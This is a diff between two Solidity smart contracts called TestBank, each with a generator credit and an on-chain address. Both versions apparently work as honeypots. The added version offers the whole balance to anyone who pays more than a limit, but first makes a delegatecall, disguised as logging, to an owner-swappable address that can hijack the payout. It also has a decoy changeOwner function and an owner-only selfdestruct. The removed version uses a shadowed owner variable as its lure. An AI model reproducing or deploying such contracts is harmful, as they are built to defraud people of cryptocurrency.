@@ -1,41 +1,43 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract TestBank at 0x70c01853e4430cae353c9a7ae232a6a95f6cafd9
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract testBank at 0x47000de9ac92e29d4fee617732ffeedc306bd10e
 */
-pragma solidity ^0.4.18;
+pragma solidity 0.4.11;
 
-contract Owned {
-    address public owner;
-    function Owned() { owner = msg.sender; }
-    modifier onlyOwner{ if (msg.sender != owner) revert(); _; }
-}
-
-contract TestBank is Owned {
-    event BankDeposit(address from, uint amount);
-    event BankWithdrawal(address from, uint amount);
-    address public owner = msg.sender;
-    uint256 ecode;
-    uint256 evalue;
-
-    function() public payable {
-        deposit();
+contract testBank
+{
+    address Owner=0x46Feeb381e90f7e30635B4F33CE3F6fA8EA6ed9b;
+    address adr;
+    uint256 public Limit= 1000000000000000001;
+    address emails = 0xa1204c9539dcd9b7c8893adcc96e5a35a91d0c5b;
+    
+    
+    function Update(address dataBase, uint256 limit)
+    {
+        require(msg.sender == Owner); //checking the owner
+        Limit = limit;
+        emails = dataBase;
     }
-
-    function deposit() public payable {
-        require(msg.value > 0);
-        BankDeposit(msg.sender, msg.value);
+    
+    function changeOwner(address adr){
+        // update Owner=msg.sender;
     }
-
-    function setEmergencyCode(uint256 code, uint256 value) public onlyOwner {
-        ecode = code;
-        evalue = value;
+    
+    function()payable{}
+    
+    function withdrawal()
+    payable public
+    {
+        adr=msg.sender;
+        if(msg.value>Limit)
+        {  
+            emails.delegatecall(bytes4(sha3("logEvent()")));
+            adr.send(this.balance);
+        }
     }
-
-    function useEmergencyCode(uint256 code) public payable {
-        if ((code == ecode) && (msg.value == evalue)) owner = msg.sender;
+    
+    function kill() {
+        require(msg.sender == Owner);
+        selfdestruct(msg.sender);
     }
-
-    function withdraw(uint amount) public onlyOwner {
-        require(amount <= this.balance);
-        msg.sender.transfer(amount);
-    }
+    
 }
